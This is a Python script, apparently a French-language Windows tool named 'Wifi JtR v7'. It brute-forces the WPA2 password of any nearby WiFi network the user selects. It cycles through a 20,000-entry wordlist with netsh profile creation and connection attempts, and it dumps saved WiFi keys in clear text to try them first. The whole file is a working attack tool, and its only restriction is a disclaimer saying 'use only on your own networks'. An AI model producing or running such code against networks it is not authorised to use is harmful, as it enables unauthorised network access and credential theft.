# -*- coding: utf-8 -*-
"""Wifi JtR v7 - testeur de mots de passe WiFi (Windows).
1. Liste les reseaux WiFi
2. Choisissez un reseau par numero
3. Teste chaque mot de passe de la liste, un par un
4. Des qu'un mot de passe fonctionne, il l'affiche et s'arrete
5. Connexion automatique des autres reseaux desactivee pendant le test,
   puis restauree automatiquement a la fin
A utiliser UNIQUEMENT sur vos propres reseaux.
"""

import os
import re
import subprocess
import sys
import tempfile
import time
import xml.sax.saxutils as sax

PASSWORD_LIST = os.path.join(os.path.expanduser("~"), "Desktop",
                             "french_passwords_top20000.txt")
CONNECT_TIMEOUT = 15
POLL_DELAY = 0.4
NETSH = "netsh"


def run_netsh(args, timeout=15):
    try:
        p = subprocess.run([NETSH] + args, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return p.returncode, (p.stdout + p.stderr)
    except subprocess.TimeoutExpired:
        return -1, ""


def list_networks():
    _, out = run_netsh(["wlan", "show", "networks"])
    ssids = []
    for line in out.splitlines():
        m = re.match(r"^\s*SSID\b[^:]*:\s*(.*)$", line, re.IGNORECASE)
        if m and m.group(1).strip():
            name = m.group(1).strip()
            if name not in ssids:
                ssids.append(name)
    return ssids


def interface_info():
    """(etat, ssid) : etat = 1 connecte, 3 connexion en cours, 4 deconnecte,
    None inconnu ; ssid = reseau connecte (ou None). Un seul appel netsh."""
    _, out = run_netsh(["wlan", "show", "interfaces"], timeout=10)
    lines = out.splitlines()
    for i, line in enumerate(lines):
        m = re.match(r"^\s*(?:State|Ã‰tat|Etat)\s*:\s*(.+)$", line,
                     re.IGNORECASE)
        if m:
            v = m.group(1).lower()
            if any(k in v for k in ("connectÃ©", "connecte", "connected",
                                    "associÃ©", "associe")):
                state = 1
            elif any(k in v for k in ("deconnectÃ©", "deconnecte", "dÃ©connect",
                                      "disconnected", "not connected")):
                state = 4
            elif any(k in v for k in ("connecting", "connexion en cours",
                                      "authenticating", "authentification")):
                state = 3
            else:
                state = None
            ssid = None
            for j in range(i, min(i + 8, len(lines))):
                sm = re.match(r"^\s*SSID\s*:\s*(.*)$", lines[j],
                              re.IGNORECASE)
                if sm:
                    ssid = sm.group(1).strip()
                    break
            return state, ssid
    return None, None


def saved_profile_passwords():
    """Mots de passe stockes dans les profils Windows."""
    found = {}
    _, out = run_netsh(["wlan", "show", "profiles"], timeout=15)
    for m in re.finditer(r"^\s*All User Profile\s*:\s*(.+)$", out,
                         re.MULTILINE | re.IGNORECASE):
        name = m.group(1).strip()
        if not name:
            continue
        _, prof = run_netsh(["wlan", "show", "profile", "name=%s" % name,
                             "key=clear"], timeout=15)
        km = re.search(r"(?:Key Content|Contenu de la cl[eÃ©])\s*:\s*(.+)$",
                       prof, re.MULTILINE | re.IGNORECASE)
        if km:
            found[name] = km.group(1).strip()
    return found


def disable_auto_connect():
    """Passe tous les profils en connexion manuelle. Retourne ceux a restaurer."""
    restore = []
    _, out = run_netsh(["wlan", "show", "profiles"], timeout=15)
    for m in re.finditer(r"^\s*All User Profile\s*:\s*(.+)$", out,
                         re.MULTILINE | re.IGNORECASE):
        name = m.group(1).strip()
        if not name:
            continue
        _, prof = run_netsh(["wlan", "show", "profile", "name=%s" % name],
                            timeout=10)
        low = prof.lower()
        if "manually" in low or "manuelle" in low:
            continue
        rc, _ = run_netsh(["wlan", "set", "profileparameter",
                           "name=%s" % name, "connectionmode=manual"],
                          timeout=10)
        if rc == 0:
            restore.append(name)
    return restore


def restore_auto_connect(restore):
    for name in restore:
        run_netsh(["wlan", "set", "profileparameter", "name=%s" % name,
                   "connectionmode=auto"], timeout=10)


def load_passwords(path):
    if not os.path.exists(path):
        sys.exit("[!] Liste introuvable : %s" % path)
    lines = None
    for enc in ("utf-8", "latin-1", "cp1252"):
        try:
            with open(path, encoding=enc, errors="strict") as f:
                lines = f.read().splitlines()
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
    if lines is None:
        with open(path, encoding="utf-8", errors="replace") as f:
            lines = f.read().splitlines()
    passwords = []
    seen = set()
    for ln in lines:
        pwd = ln.strip().strip('"').strip("'")
        if (pwd and not pwd.startswith("#") and 8 <= len(pwd) <= 63
                and pwd not in seen):
            seen.add(pwd)
            passwords.append(pwd)
    return passwords


def make_profile_xml(ssid, password):
    def esc(s):
        return sax.escape(s)
    return ('<?xml version="1.0"?>\n'
            '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n'
            '    <name>%s</name>\n'
            '    <SSIDConfig>\n'
            '        <SSID>\n'
            '            <name>%s</name>\n'
            '        </SSID>\n'
            '    </SSIDConfig>\n'
            '    <connectionType>ESS</connectionType>\n'
            '    <connectionMode>auto</connectionMode>\n'
            '    <MSM>\n'
            '        <security>\n'
            '            <authEncryption>\n'
            '                <authentication>WPA2PSK</authentication>\n'
            '                <encryption>AES</encryption>\n'
            '                <useOneX>false</useOneX>\n'
            '            </authEncryption>\n'
            '            <sharedKey>\n'
            '                <keyType>passPhrase</keyType>\n'
            '                <protected>false</protected>\n'
            '                <keyMaterial>%s</keyMaterial>\n'
            '            </sharedKey>\n'
            '        </security>\n'
            '    </MSM>\n'
            '</WLANProfile>\n') % (esc(ssid), esc(ssid), esc(password))


def status_line(msg):
    sys.stdout.write("\r" + msg + " " * 40)
    sys.stdout.flush()

def try_password(ssid, password):
    """Teste UN mot de passe. True = le mot de passe est bon."""
    print("  [1/3] Creation du profil WiFi...", end="", flush=True)
    t0 = time.time()
    xml = make_profile_xml(ssid, password)
    fd, path = tempfile.mkstemp(suffix=".xml", prefix="wifi_jtr_")
    try:
        with os.fdopen(fd, "w", encoding="utf-16") as f:
            f.write(xml)
        run_netsh(["wlan", "delete", "profile", "name=%s" % ssid], timeout=10)
        rc, _ = run_netsh(["wlan", "add", "profile", "filename=%s" % path],
                          timeout=10)
        if rc != 0:
            print(" ERREUR (profil refuse)")
            return None
        print(" ok (%.1f s)" % (time.time() - t0))
        print("  [2/3] Deconnexion du reseau actuel... ok")
        run_netsh(["wlan", "disconnect"], timeout=10)
        time.sleep(0.3)
        print("  [3/3] Tentative de connexion a \"%s\"..." % ssid)
        run_netsh(["wlan", "connect", "name=%s" % ssid, "ssid=%s" % ssid],
                  timeout=10)
        t0 = time.time()
        seen_inprogress = False
        while time.time() - t0 < CONNECT_TIMEOUT:
            el = time.time() - t0
            st, cur = interface_info()
            if st == 1 and cur == ssid:
                time.sleep(1.0)
                st2, cur2 = interface_info()
                if st2 == 1 and cur2 == ssid:
                    return True
                st, cur = st2, cur2
            if st == 3:
                seen_inprogress = True
                status_line("     >> Connexion en cours... %.1f s" % el)
            elif st == 4:
                status_line("     >> Deconnecte (attente d'un essai)... %.1f s"
                            % el)
                if seen_inprogress and el > 2.0:
                    return False
            elif st == 1:
                status_line("     >> Connecte a un autre reseau... %.1f s" % el)
            else:
                status_line("     >> Etat inconnu, en attente... %.1f s" % el)
            time.sleep(POLL_DELAY)
        return False
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def fmt_duration(seconds):
    seconds = int(seconds)
    if seconds < 60:
        return "%d s" % seconds
    m, s = divmod(seconds, 60)
    if m < 60:
        return "%d min %d s" % (m, s)
    h, m = divmod(m, 60)
    return "%d h %d min" % (h, m)


def attack(ssid, passwords):
    restore = disable_auto_connect()
    if restore:
        print("[i] Connexion automatique des %d autres reseaux desactivee "
              "(restauree a la fin)." % len(restore))
    print("(Ctrl+C pour arreter a tout moment)\n")
    t_start = time.time()
    total = len(passwords)
    found = None
    tried = 0
    try:
        for i, pwd in enumerate(passwords, 1):
            t0 = time.time()
            tried = i
            pct = 100.0 * i / total
            print("\n[Essai %d/%d - %.1f%%] Mot de passe teste : %r"
                  % (i, total, pct, pwd))
            ok = try_password(ssid, pwd)
            dt = time.time() - t0
            if ok is None:
                print("  => ERREUR : profil refuse par Windows (essai suivant)")
                continue
            if ok:
                found = pwd
                print("\n" + "=" * 56)
                print("  [+] MOT DE PASSE TROUVE : %s" % pwd)
                print("  [+] Reseau : %s (essai %d/%d, %.1f min ecoulees)"
                      % (ssid, i, total, (time.time() - t_start) / 60.0))
                print("=" * 56)
                break
            print("\n  => Mauvais mot de passe, rejete par le reseau (%.1f s)"
                  % dt)
            run_netsh(["wlan", "disconnect"], timeout=10)
            run_netsh(["wlan", "delete", "profile", "name=%s" % ssid], timeout=10)
            avg = (time.time() - t_start) / i
            eta = avg * (total - i)
            print("  [vitesse] Moyenne : %.1f s/essai - temps restant estime : ~%s"
                  % (avg, fmt_duration(eta)))
    except KeyboardInterrupt:
        print("\n[!] Arrete par l'utilisateur (Ctrl+C).")
    finally:
        run_netsh(["wlan", "disconnect"], timeout=10)
        if found is None:
            run_netsh(["wlan", "delete", "profile", "name=%s" % ssid], timeout=10)
            print("\n[-] Aucun mot de passe de la liste ne fonctionne.")
        else:
            print("\n[i] Vous etes connecte au reseau %s avec le mot de passe trouve."
                  % ssid)
        restore_auto_connect(restore)
        if restore:
            print("[i] Connexion automatique des autres reseaux RESTAUREE.")
        print("[i] Temps total : %.1f minutes (%d essais)."
              % ((time.time() - t_start) / 60.0, tried))
    wait_before_close()


def wait_before_close():
    try:
        if sys.stdin and sys.stdin.isatty():
            input("\nAppuyez sur Entree pour fermer...")
    except Exception:
        pass


def main():
    print("=" * 56)
    print("  Wifi JtR v7 - testeur de mots de passe WiFi")
    print("  (UNIQUEMENT pour vos propres reseaux)")
    print("=" * 56)

    networks = list_networks()
    if not networks:
        print("\n[!] Aucun reseau WiFi detecte. Activez votre carte WiFi.")
        wait_before_close()
        return
    print("\nReseaux detectes :")
    for i, s in enumerate(networks, 1):
        print("  %d. %s" % (i, s))

    while True:
        try:
            choice = int(input("\nChoisissez un reseau (numero) : "))
            if 1 <= choice <= len(networks):
                break
        except ValueError:
            pass
        print("Numero invalide, reessayez.")

    ssid = networks[choice - 1]
    print("\n[OK] Reseau choisi : %s" % ssid)
    print("[OK] Chargement de la liste de mots de passe...")
    passwords = load_passwords(PASSWORD_LIST)
    if not passwords:
        print("\n[!] Aucun mot de passe utilisable dans la liste.")
        wait_before_close()
        return

    saved = saved_profile_passwords()
    if ssid in saved:
        stored = saved[ssid]
        if 8 <= len(stored) <= 63 and stored not in passwords:
            passwords.insert(0, stored)
        print("[OK] Un mot de passe enregistre dans Windows sera teste en premier :")
        print("     %r (il sera verifie par une vraie connexion)" % stored)
    else:
        print("[OK] Aucun mot de passe enregistre pour ce reseau dans Windows.")

    print("[OK] %d mots de passe a tester sur \"%s\"." % (len(passwords), ssid))
    attack(ssid, passwords)


if __name__ == "__main__":
    main()

